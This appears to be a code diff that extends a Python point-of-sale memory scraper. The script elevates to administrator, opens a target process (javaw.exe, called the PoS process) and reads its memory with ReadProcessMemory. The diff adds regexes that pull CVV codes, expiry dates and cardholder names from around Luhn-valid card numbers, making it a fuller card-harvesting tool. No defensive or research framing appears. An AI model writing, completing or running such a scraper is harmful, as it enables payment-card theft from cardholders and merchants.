@@ -25,18 +25,39 @@ def validate_luhn(card_number):
         total += n
     return total % 10 == 0
 
-# Credit card pattern using regex (adjust for specific PoS system)
-cc_regex = re.compile(r'\b(?:\d[ -]*?){13,19}\b')
+# Expanded regex patterns
+cc_regex = re.compile(r'(\b(?:\d[ -]*?){13,19}\b)')  # Credit card number
+cvv_regex = re.compile(r'\b\d{3,4}\b')  # CVV code (3 or 4 digits)
+expiry_regex = re.compile(r'\b(0[1-9]|1[0-2])/(?:[0-9]{2}|[0-9]{4})\b')  # Expiry date MM/YY or MM/YYYY
+name_regex = re.compile(r'\b[A-Z][a-z]+ [A-Z][a-z]+\b')  # Simple name pattern (First Last)
 
 # Scan a buffer for potential credit card data
 def scan_memory_chunk(memory_chunk):
-    matches = cc_regex.findall(memory_chunk)
-    valid_cards = []
-    for match in matches:
-        sanitized = re.sub(r'[^\d]', '', match)  # Remove non-numeric characters
-        if validate_luhn(sanitized):  # Only return valid Luhn credit cards
-            valid_cards.append(sanitized)
-    return valid_cards
+    results = []
+
+    card_matches = cc_regex.findall(memory_chunk)
+    for card_match in card_matches:
+        sanitized_card = re.sub(r'[^\d]', '', card_match)  # Remove non-numeric characters
+
+        if validate_luhn(sanitized_card):
+            # Try to find associated CVV, expiry date, and name near the card
+            match_index = memory_chunk.find(card_match)
+            surrounding_text = memory_chunk[max(0, match_index - 100): match_index + 300]
+
+            # Find possible CVV, expiry date, and name nearby
+            cvv_match = cvv_regex.search(surrounding_text)
+            expiry_match = expiry_regex.search(surrounding_text)
+            name_match = name_regex.search(surrounding_text)
+
+            card_info = {
+                'Card Number': sanitized_card,
+                'CVV': cvv_match.group(0) if cvv_match else 'Not Found',
+                'Expiry Date': expiry_match.group(0) if expiry_match else 'Not Found',
+                'Name': name_match.group(0) if name_match else 'Not Found'
+            }
+            results.append(card_info)
+
+    return results
 
 # Worker thread that processes memory chunks
 def memory_scan_worker(process_handle):
@@ -48,9 +69,9 @@ def memory_scan_worker(process_handle):
             if ctypes.windll.kernel32.ReadProcessMemory(process_handle, ctypes.c_void_p(base_addr), buffer, size, ctypes.byref(bytesRead)):
                 valid_cards = scan_memory_chunk(buffer.raw.decode('latin-1'))
                 if valid_cards:
-                    print(f"Found valid card(s) at address {base_addr}: {valid_cards}")
+                    for card in valid_cards:
+                        print(f"Found card at address {base_addr}: {card}")
         except Exception as e:
-            # Handle exceptions (e.g., access violations, decoding errors)
             print(f"Error reading memory at {base_addr}: {e}")
         finally:
             memory_queue.task_done()
@@ -89,51 +110,40 @@ def get_memory_regions(pid):
 
 # Main function to scan memory of target process
 def scan_process_memory(pid, num_threads=4):
-    # Get memory regions
     memory_regions = get_memory_regions(pid)
     if not memory_regions:
         print(f"No valid memory regions found for PID {pid}")
         return
 
-    # Add regions to queue
     for region in memory_regions:
         memory_queue.put(region)
 
-    # Open process for reading
     process_handle = ctypes.windll.kernel32.OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, False, pid)
 
-    # Create and start worker threads
     threads = []
     for _ in range(num_threads):
         t = threading.Thread(target=memory_scan_worker, args=(process_handle,))
         t.start()
         threads.append(t)
 
-    # Wait for the queue to be processed
     memory_queue.join()
 
-    # Clean up threads and process handle
     for t in threads:
         t.join()
     ctypes.windll.kernel32.CloseHandle(process_handle)
 
 def is_admin():
-    """
-    Check if the script is running with administrative privileges.
-    """
     try:
         return ctypes.windll.shell32.IsUserAnAdmin()
     except:
         return False
 
 if __name__ == "__main__":
-    # Ensure the script is running as admin
     if not is_admin():
         print("Attempting to restart with admin privileges...")
         ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
         sys.exit(0)
 
-    # Get PID of javaw.exe (adjust based on target PoS process)
     for proc in psutil.process_iter(['pid', 'name']):
         if proc.info['name'] == 'javaw.exe':
             target_pid = proc.info['pid']
